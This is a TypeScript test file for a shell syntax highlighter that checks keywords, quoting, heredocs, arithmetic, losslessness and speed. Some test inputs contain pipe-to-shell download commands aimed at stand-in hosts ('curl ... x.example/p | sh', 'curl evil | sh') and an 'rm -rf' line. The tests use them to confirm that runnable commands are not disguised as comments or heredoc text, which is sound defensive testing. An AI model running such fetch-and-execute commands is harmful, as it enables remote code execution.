import assert from "node:assert/strict";
import { test } from "node:test";

import {
  HIGHLIGHT_LIMIT,
  looksLikeShell,
  plainLines,
  scriptLanguage,
  scriptLines,
  tokenizeShell,
  type ShellLine,
  type ShellTokenKind,
} from "../shellTokens.ts";

/** The lines joined back: the tokenizer's one hard promise is that this is the input. */
function rejoin(lines: ShellLine[]): string {
  return lines.map((line) => line.tokens.map((token) => token.text).join("")).join("\n");
}

/**
 * Every token as `kind:text`, in order. Plain runs absorb the spaces around
 * them, so their text is trimmed and whitespace-only ones are dropped.
 */
function kinds(source: string): string[] {
  return tokenizeShell(source)
    .flatMap((line) => line.tokens)
    .map((token) => (token.kind === "plain" ? { ...token, text: token.text.trim() } : token))
    .filter((token) => !(token.kind === "plain" && token.text === ""))
    .map((token) => `${token.kind}:${token.text}`);
}

/** The kind of the first token whose text (trimmed, for plain runs) is `text`. */
function kindOf(source: string, text: string): ShellTokenKind | undefined {
  return tokenizeShell(source)
    .flatMap((line) => line.tokens)
    .find((token) => token.text === text || (token.kind === "plain" && token.text.trim() === text))?.kind;
}

test("comments, keywords, builtins, operators and numbers on an ordinary line", () => {
  assert.deepEqual(kinds("if [ -f /etc/x ]; then echo ok >&2; exit 1; fi # done"), [
    "keyword:if",
    "builtin:[",
    "plain:-f /etc/x ]",
    "operator:;",
    "keyword:then",
    "builtin:echo",
    "plain:ok",
    "operator:>&",
    "number:2",
    "operator:;",
    "builtin:exit",
    "number:1",
    "operator:;",
    "keyword:fi",
    "comment:# done",
  ]);
});

test("a reserved word is a keyword only where a command may start", () => {
  // `echo if` prints the word; `if` here is an argument, not a keyword.
  assert.equal(kindOf("echo if then", "if then"), "plain");
  // A builtin's name as an argument is an argument too.
  assert.equal(kindOf("command -v echo", "-v echo"), "plain");
  // `in` is a keyword after for and case, nowhere else.
  assert.equal(kindOf("for x in a b; do :; done", "in"), "keyword");
  assert.equal(kindOf("echo in", "in"), "plain");
  assert.equal(kindOf('case "$SRC" in /*) ;; esac', "in"), "keyword");
  assert.equal(kindOf('case "$SRC" in /*) ;; esac', "esac"), "keyword");
});

test("a comment starts only at the start of a word", () => {
  assert.equal(kindOf("echo a#b", "a#b"), "plain");
  // Adjacent tokens of one kind merge, so the whole expansion is one variable.
  assert.equal(kindOf("echo ${#list}", "${#list}"), "variable");
  assert.equal(kindOf('echo "#not" # yes', "# yes"), "comment");
  // Code before a comment keeps its colours; the comment runs to the line end only.
  assert.deepEqual(kinds("ls -la # list\nexit 0"), ["plain:ls -la", "comment:# list", "builtin:exit", "number:0"]);
});

test("quotes with escapes: the escaped quote does not close the string", () => {
  assert.deepEqual(kinds('echo "say \\"hi\\" to $USER" \'it\'\\\'\'s\''), [
    "builtin:echo",
    'string:"say \\"hi\\" to ',
    "variable:$USER",
    'string:"',
    "string:'it'",
    "plain:\\'",
    "string:'s'",
  ]);
  // A single-quoted string is literal: no variable inside it.
  assert.equal(kindOf("echo '$HOME'", "'$HOME'"), "string");
  // ANSI-C quoting takes backslash escapes, including an escaped quote.
  assert.equal(kindOf("printf $'a\\'b\\n'", "$'a\\'b\\n'"), "string");
});

test("variables and expansions, nested $() inside a string inside $()", () => {
  const source = 'out="$(printf "%s" "$(cat "${DIR:-/tmp}/x")")"';
  assert.equal(rejoin(tokenizeShell(source)), source);
  assert.deepEqual(kinds(source), [
    "variable:out",
    "operator:=",
    'string:"',
    "variable:$(",
    "builtin:printf",
    'string:"%s"',
    'string:"',
    "variable:$(",
    "plain:cat",
    'string:"',
    "variable:${DIR:-/tmp}",
    'string:/x"',
    "variable:)",
    'string:"',
    "variable:)",
    'string:"',
  ]);
  assert.deepEqual(kinds("echo $1 $@ $? $$ ${#a[@]} `date`"), [
    "builtin:echo",
    "variable:$1",
    "variable:$@",
    "variable:$?",
    "variable:$$",
    "variable:${#a[@]}",
    "variable:`",
    "plain:date",
    "variable:`",
  ]);
});

test("arithmetic expansion colours names, numbers and operators", () => {
  assert.deepEqual(kinds("n=$(( count * 2 + ${base} ))"), [
    "variable:n",
    "operator:=",
    "variable:$((",
    "variable:count",
    "operator:*",
    "number:2",
    "operator:+",
    "variable:${base}",
    "variable:))",
  ]);
});

test("a heredoc with a quoted delimiter is literal, and its body lines are marked", () => {
  const source = [
    "cat > \"$REVERT\" <<'LATTICE_SSHGUARD_REVERT'",
    "#!/bin/sh",
    "STATE=$HOME # not a comment here",
    "",
    "LATTICE_SSHGUARD_REVERT",
    "chmod 0700 \"$REVERT\"",
  ].join("\n");
  const lines = tokenizeShell(source);
  assert.equal(rejoin(lines), source);
  assert.deepEqual(lines.map((line) => line.heredoc), [false, true, true, true, false, false]);
  // The body is one heredoc token per line: no comment, no variable.
  assert.deepEqual(lines[2]!.tokens, [{ kind: "heredoc", text: "STATE=$HOME # not a comment here" }]);
  assert.deepEqual(lines[4]!.tokens, [{ kind: "string", text: "LATTICE_SSHGUARD_REVERT" }]);
  assert.equal(kindOf(source, "'LATTICE_SSHGUARD_REVERT'"), "string");
  assert.equal(lines[5]!.tokens[0]!.kind, "plain");
  assert.equal(kindOf(source, "0700"), "number");
});

test("an unquoted heredoc expands variables; <<- strips leading tabs before the delimiter", () => {
  const source = "cat <<-EOF >/etc/unit\n\tUser=${USER}\n\tExecStart=$(command -v agent) --run\n\tEOF\necho after";
  const lines = tokenizeShell(source);
  assert.equal(rejoin(lines), source);
  assert.deepEqual(lines.map((line) => line.heredoc), [false, true, true, false, false]);
  assert.deepEqual(lines[1]!.tokens, [
    { kind: "heredoc", text: "\tUser=" },
    { kind: "variable", text: "${USER}" },
  ]);
  assert.deepEqual(lines[2]!.tokens, [
    { kind: "heredoc", text: "\tExecStart=" },
    { kind: "variable", text: "$(command -v agent)" },
    { kind: "heredoc", text: " --run" },
  ]);
  assert.equal(lines[4]!.tokens[0]!.kind, "builtin");
});

test("two heredocs on one line are read in order, and a delimiter inside the body does not end it early", () => {
  const source = "paste <<A <<\"B\"\none\nAA\nA\ntwo $x\nB\ndone_word";
  const lines = tokenizeShell(source);
  assert.equal(rejoin(lines), source);
  assert.deepEqual(lines.map((line) => line.heredoc), [false, true, true, false, true, false, false]);
  // B's delimiter was quoted, so `$x` in its body is literal.
  assert.deepEqual(lines[4]!.tokens, [{ kind: "heredoc", text: "two $x" }]);
});

test("a here-string is not a heredoc", () => {
  const lines = tokenizeShell("grep -q x <<< \"$body\"\nnext");
  assert.deepEqual(lines.map((line) => line.heredoc), [false, false]);
  assert.equal(kindOf("grep -q x <<< \"$body\"", "<<<"), "operator");
});

test("<< inside (( )), for (( )) and $[ ] shifts: the lines after it are code, not a heredoc body", () => {
  // bash runs lines 2 and 3 (printf ... | bash printed mask=16 and ran the
  // curl). Marking them as heredoc said "a file the script writes".
  const source = "(( mask = 1 << 4 ))\ncurl -s https://x.example/p | sh\necho done";
  const lines = tokenizeShell(source);
  assert.equal(rejoin(lines), source);
  assert.deepEqual(lines.map((line) => line.heredoc), [false, false, false]);
  assert.deepEqual(kinds(source), [
    "keyword:((",
    "variable:mask",
    "operator:=",
    "number:1",
    "operator:<<",
    "number:4",
    "keyword:))",
    "plain:curl -s https://x.example/p",
    "operator:|",
    "plain:sh",
    "builtin:echo",
    "plain:done",
  ]);
  // After a separator, inside if, and as a for loop's head.
  for (const head of ["true && (( x <<= 1 ))", "if (( n << 2 > 8 )); then :; fi", "for (( i = 1; i << 1 < 9; i++ )); do :; done", "echo $[ 1 << 2 ]"]) {
    const doc = tokenizeShell(`${head}\nrm -f /tmp/x\nEOF`);
    assert.deepEqual(doc.map((line) => line.heredoc), [false, false, false], head);
    assert.equal(kindOf(head, "<<") ?? kindOf(head, "<<="), "operator", head);
  }
  assert.equal(kindOf("for ((i=0; i<3; i++)); do echo $i; done", "do"), "keyword");
  assert.equal(kindOf("echo $[ 1 << 2 ]", "]"), "variable");
  // `((` that is not where a command starts is still two parentheses.
  assert.equal(kindOf("echo x((", "x"), "plain");
});

test("((cmd) ) and $((cmd) ) are subshells, as in the shell, once the first ) is not doubled", () => {
  // bash 3.2 and 5: `((echo a) )` prints a, `x=$((echo b) )` sets x=b.
  // (Adjacent operators merge into one token: the outer `)` and the `;`.)
  assert.deepEqual(kinds("((echo a) ); echo b").slice(-4), ["operator:)", "operator:);", "builtin:echo", "plain:b"]);
  const sub = "x=$((echo b) ); echo c";
  assert.equal(rejoin(tokenizeShell(sub)), sub);
  assert.deepEqual(kinds(sub).slice(-5), ["operator:)", "variable:)", "operator:;", "builtin:echo", "plain:c"]);
  // Inside $( ), the outer subshell of `((cmd) )` still owns the next ).
  assert.deepEqual(kinds("y=$( ((echo a) ) ); echo d").slice(-5), ["operator:)", "variable:)", "operator:;", "builtin:echo", "plain:d"]);
  // A real arithmetic expansion with inner parentheses is unaffected.
  assert.deepEqual(kinds("n=$(( (1 + 2) * 3 ))"), [
    "variable:n",
    "operator:=",
    "variable:$((",
    "operator:(",
    "number:1",
    "operator:+",
    "number:2",
    "operator:)",
    "operator:*",
    "number:3",
    "variable:))",
  ]);
});

test("a comment inside backquotes ends at the closing backquote, and what follows runs", () => {
  // bash prints EXECUTED for both: the comment stops at the backquote.
  assert.deepEqual(kinds("echo `true # note`; rm -rf /tmp/x"), [
    "builtin:echo",
    "variable:`",
    "builtin:true",
    "comment:# note",
    "variable:`",
    "operator:;",
    "plain:rm -rf /tmp/x",
  ]);
  assert.deepEqual(kinds('echo "`date # c`"; curl evil | sh'), [
    "builtin:echo",
    'string:"',
    "variable:`",
    "plain:date",
    "comment:# c",
    "variable:`",
    'string:"',
    "operator:;",
    "plain:curl evil",
    "operator:|",
    "plain:sh",
  ]);
  // The backquote is not swallowed, so the next line keeps its colours.
  assert.equal(kindOf("x=`true # x`\nif true; then :; fi", "if"), "keyword");
  // An escaped backquote does not end the comment; the closing one does.
  assert.equal(kindOf("echo `true # a \\` b`; ls", "# a \\` b"), "comment");
  // A comment may open a backquoted command: `#c` there is all comment.
  assert.deepEqual(kinds("echo `#c`; ls"), ["builtin:echo", "variable:`", "comment:#c", "variable:`", "operator:;", "plain:ls"]);
  // Outside backquotes a comment still runs to the line end, even inside $( ).
  assert.equal(kindOf("x=$(echo a # c ) d\n)", "# c ) d"), "comment");
});

test("# after a quote or an expansion continues the word", () => {
  // `"x"#y` is the word x#y and `$x#y` is $x then #y, both printed by echo.
  assert.ok(!kinds('echo "x"#y').some((token) => token.startsWith("comment:")));
  assert.ok(!kinds("echo $x#y").some((token) => token.startsWith("comment:")));
  assert.ok(!kinds("echo ${x}#y `date`#z").some((token) => token.startsWith("comment:")));
});

test("a subshell inside $( ) holds the substitution open until its own )", () => {
  assert.deepEqual(kinds("x=$( (cd /; ls) ; echo hi )"), [
    "variable:x",
    "operator:=",
    "variable:$(",
    "operator:(",
    "builtin:cd",
    "plain:/",
    "operator:;",
    "plain:ls",
    "operator:)",
    "operator:;",
    "builtin:echo",
    "plain:hi",
    "variable:)",
  ]);
});

test("assignments colour the name; a command after a prefix assignment is still a command", () => {
  assert.deepEqual(kinds("PATH=/usr/bin:$PATH export PATH"), [
    "variable:PATH",
    "operator:=",
    "plain:/usr/bin:",
    "variable:$PATH",
    "plain:export PATH",
  ]);
  assert.deepEqual(kinds("LANG=C printf x"), ["variable:LANG", "operator:=", "plain:C", "builtin:printf", "plain:x"]);
});

test("functions, groups and pipelines", () => {
  assert.deepEqual(kinds("fail() { echo \"$*\" >&2; exit 1; }\nfail x || true | cat"), [
    "plain:fail",
    "operator:()",
    "keyword:{",
    "builtin:echo",
    'string:"',
    "variable:$*",
    'string:"',
    "operator:>&",
    "number:2",
    "operator:;",
    "builtin:exit",
    "number:1",
    "operator:;",
    "keyword:}",
    "plain:fail x",
    "operator:||",
    "builtin:true",
    "operator:|",
    "plain:cat",
  ]);
});

test("unterminated quotes, substitutions and heredocs run to the end and lose nothing", () => {
  for (const source of [
    'echo "never closed $HOME',
    "echo 'never closed",
    "x=$(echo (",
    "y=${a:-",
    "z=$(( 1 + ",
    "cat <<EOF\nbody without an end",
    "echo `date",
    "echo \\",
    "$",
    "<<",
    "cat <<''\nx",
    "(( x << 1",
    "for ((",
    "$[ 1 <<",
    "((echo a) ",
    "echo `# open",
  ]) {
    assert.equal(rejoin(tokenizeShell(source)), source, source);
  }
  assert.deepEqual(tokenizeShell("cat <<EOF\nbody\nmore").map((line) => line.heredoc), [false, true, true]);
});

test("CRLF line ends keep keywords recognisable", () => {
  assert.equal(kindOf("if true\r\nthen :\r\nfi\r\n", "if"), "keyword");
  assert.equal(kindOf("if true\r\nthen :\r\nfi\r\n", "fi"), "keyword");
});

test("lossless on every input: random strings drawn from the shell's special characters", () => {
  const alphabet = ["a", "Z", "_", "1", " ", "\t", "\n", "\r", "#", "$", "{", "}", "(", ")", "'", "\"", "`", "\\", "<", ">", "|", "&", ";", "-", "=", "!", "[", "]", "*", "?", "EOF", "<<", "<<-", "$(", "${", "$((", "((", "$[", "for ", "if ", "fi", "é", "中"];
  let seed = 7;
  const next = () => {
    seed = (seed * 1103515245 + 12345) % 2147483648;
    return seed;
  };
  for (let round = 0; round < 3000; round++) {
    const length = next() % 60;
    let source = "";
    for (let k = 0; k < length; k++) source += alphabet[next() % alphabet.length];
    assert.equal(rejoin(tokenizeShell(source)), source, JSON.stringify(source));
  }
});

test("a deep nest of substitutions neither overflows the stack nor loses text", () => {
  const source = "echo " + "$(".repeat(20000) + "x" + ")".repeat(20000);
  assert.equal(rejoin(tokenizeShell(source)), source);
  // A storm of `((`, each one arithmetic until a lone `)` says otherwise: one pass, no lookahead.
  for (const storm of ["((".repeat(50000), "((x) ".repeat(20000), "`#`".repeat(30000)]) {
    const started = performance.now();
    assert.equal(rejoin(tokenizeShell(storm)), storm);
    assert.ok(performance.now() - started < 150, `${storm.slice(0, 6)}... took too long`);
  }
});

test("a very long script: lossless, one line per line, and fast enough for a sheet (200 KB under 150 ms)", () => {
  const block = [
    "#!/bin/sh",
    "set -eu",
    "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    'fail() { echo "lattice: $*" >&2; exit 1; }',
    'for f in /etc/lattice/*.conf; do [ -r "$f" ] || fail "cannot read $f"; done',
    "cat > /etc/systemd/system/lattice-witness.service <<'UNIT'",
    "[Service]",
    "ExecStart=/usr/local/bin/lattice-agent -witness",
    "UNIT",
    'n=$(( $(wc -l < /etc/hosts) + 1 )) # count',
    'case "${MODE:-apply}" in apply) systemctl daemon-reload ;; *) : ;; esac',
  ].join("\n");
  let source = "";
  while (source.length < 200 * 1024) source += block + "\n";
  const started = performance.now();
  const lines = tokenizeShell(source);
  const elapsed = performance.now() - started;
  assert.equal(rejoin(lines), source);
  assert.equal(lines.length, source.split("\n").length);
  assert.ok(elapsed < 150, `tokenized ${source.length} characters in ${elapsed.toFixed(1)} ms`);
});

test("the language: sh and bash are shell, the other interpreters are plain", () => {
  assert.equal(scriptLanguage("sh"), "shell");
  assert.equal(scriptLanguage("bash"), "shell");
  assert.equal(scriptLanguage("python3"), "plain");
  assert.equal(scriptLanguage("node"), "plain");
  assert.equal(scriptLanguage(undefined), "plain");
});

test("a plan is shell only when it says so", () => {
  assert.equal(looksLikeShell("#!/bin/sh\necho hi"), true);
  assert.equal(looksLikeShell("#!/usr/bin/env bash\nset -e"), true);
  assert.equal(looksLikeShell("\n\nset -eu\nexport PATH=/bin"), true);
  assert.equal(looksLikeShell("# lattice-linechain-e3-v2\nset -eu\n: ok"), true);
  // nft names its own interpreter; JSON and key-value plans are not shell.
  assert.equal(looksLikeShell("#!/usr/sbin/nft -f\ntable inet lattice {}"), false);
  assert.equal(looksLikeShell('{"plugin":"agentupdate"}'), false);
  assert.equal(looksLikeShell("plugin: agentupdate\nmode: manual"), false);
  assert.equal(looksLikeShell(""), false);
});

test("over the limit, or plain, the lines carry the text with no colour", () => {
  const big = "echo x\n".repeat(Math.ceil((HIGHLIGHT_LIMIT + 10) / 7));
  const over = scriptLines(big, "shell");
  assert.equal(over.highlighted, false);
  assert.equal(rejoin(over.lines), big);
  assert.ok(over.lines.every((line) => line.tokens.every((token) => token.kind === "plain")));
  const plain = scriptLines("print('hi')\n", "plain");
  assert.equal(plain.highlighted, false);
  assert.equal(rejoin(plain.lines), "print('hi')\n");
  assert.equal(rejoin(plainLines("a\n\nb")), "a\n\nb");
  assert.equal(scriptLines("echo x", "shell").highlighted, true);
});
